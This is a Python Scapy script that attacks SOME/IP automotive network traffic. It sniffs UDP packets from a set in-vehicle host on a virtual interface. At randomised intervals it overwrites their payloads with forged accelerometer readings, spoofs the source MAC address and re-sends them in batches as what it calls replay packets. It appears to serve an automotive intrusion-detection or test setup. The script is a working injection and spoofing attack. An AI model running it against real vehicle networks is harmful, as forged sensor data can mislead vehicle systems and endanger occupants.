from scapy.all import *
from scapy.contrib.automotive.someip import *

from common import update_udp_chksum
import time
from datetime import datetime
import struct
import numpy as np
import pdb

mean = 10
std_dev = 2

def generate_bounded_random_variable(mean, std_dev, min_val, max_val):
    while True:
        random_variable = np.random.normal(mean, std_dev)
        if min_val <= random_variable <= max_val:
            return int(random_variable)

min_val = mean - int(mean*0.1)
max_val = mean + int(mean*0.1)
random_vars = []

for _ in range(1000):
    random_var = generate_bounded_random_variable(mean, std_dev, min_val, max_val)
    random_vars.append(random_var)
print(f"Generated random variables: {random_vars[:20]}")


accel_x, accel_y, accel_z = 10.0, 20.0, 30.0
idx = 0
cnt = 0
packets = []
def process_packet(packet):
    global random_vars
    global idx
    global cnt
    global accel_x
    global accel_y
    global accel_z
    global packets

    if packet.haslayer(IP) and packet.haslayer(UDP):
        if packet.haslayer(SOMEIP):
            cnt += 1
            if random_vars[idx] != cnt:
                return
            # random_vars[idx] == cnt !
            wait_count = random_vars[idx]
            idx += 1  # select new random var
            cnt = 0   # start new count

            #accel_x += 10
            #accel_y += 10
            #accel_z += 10
            data = struct.pack('>fff', accel_x, accel_y, accel_z)
            packet[SOMEIP].payload = Raw(load=data)
            packet[IP].ttl = 4
            #packet[IP].src = '10.0.3.8'
            packet[Ether].src = '00:00:00:00:00:08'
            packet = update_udp_chksum(packet)

            if len(packets) != 5:
                packets.append(packet)
            elif len(packets) == 5:
                sendp(packets, iface='veth0.3', inter=0.02)
                print(f"send SOME/IP replay packets (10ea, 20ms)!")
                packets = []

filter = "udp and src host 10.0.3.2 and src port 31002"
sniff(filter=filter, iface='veth0.3', prn=process_packet)

